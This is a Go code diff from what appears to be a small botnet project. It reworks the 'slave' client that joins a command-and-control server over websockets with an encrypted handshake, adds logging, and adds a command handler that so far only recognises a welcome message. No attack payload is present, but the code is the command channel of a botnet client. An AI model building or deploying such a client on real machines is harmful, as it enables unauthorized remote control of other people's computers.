@@ -56,52 +56,62 @@ func (s *BotnetSlave) Start() {
 	signal.Notify(interrupt, os.Interrupt)
 
 	url := fmt.Sprintf("ws://%s%s", s.masterAddr, master.JoinEndpoint)
-	log.Printf("connecting to URL: %s", url)
-
 	c, _, err := websocket.DefaultDialer.Dial(url, nil)
 	if err != nil {
 		log.Fatal("dial:", err)
 	}
 	defer c.Close()
+	log.Printf("[slave] initiated websockets connection to command and control server at: %s", url)
 
 	// send encrypted join request completing the handshake
 	encrypted, err := buildEncryptedJoinRequest(s.slavePubKey, s.masterPubKey)
 	if err != nil {
 		log.Fatal(err)
 	}
+	log.Println("[slave] built and encrypted botnet join request with master key...")
 
 	c.WriteMessage(2, []byte(encrypted)) // binary message type (2)
+	log.Println("[slave] sent encrypted join request to command and control server...")
 
 	c.SetReadLimit(maxMessageSize)
 	c.SetReadDeadline(time.Now().Add(pongWait))
 	c.SetPongHandler(func(string) error { c.SetReadDeadline(time.Now().Add(pongWait)); return nil })
 
 	for {
-		log.Println("waiting for command and control...")
+		log.Println("[slave] waiting for command and control...")
 		msgType, encryptedMessage, err := c.ReadMessage()
-		log.Printf("we have comm with err: %s", err)
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
 				log.Printf("WS connection was closed unexpectedly: %s", err)
 			}
 			break
 		}
-
 		// discard all non binary messages
 		if msgType != 2 {
 			continue
 		}
-
 		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.slavePrivKey)
 		if err != nil {
 			log.Printf("could not decrypt message from master: %s", err)
 			continue
 		}
-		var event protocol.Event
-		if err = json.Unmarshal(jsonMsg, &event); err != nil {
+		var cmd protocol.Command
+		if err = json.Unmarshal(jsonMsg, &cmd); err != nil {
 			log.Printf("could not unmarshal message from master: %s", err)
 			continue
 		}
-		protocol.HandleMasterEvent(event)
+		handleCommand(cmd)
+	}
+}
+
+// handleCommand handles a single command from the master node
+func handleCommand(c protocol.Command) {
+	switch c.Type {
+	case protocol.CommandTypeWelcome:
+		log.Printf("[master] WELCOME!!! joined botnet at unix time: %d", time.Now().UnixNano())
+		return
+	default:
+		log.Printf("received unknown event type at %d, full command: %v", time.Now().UnixNano(), c)
+		return
 	}
 }
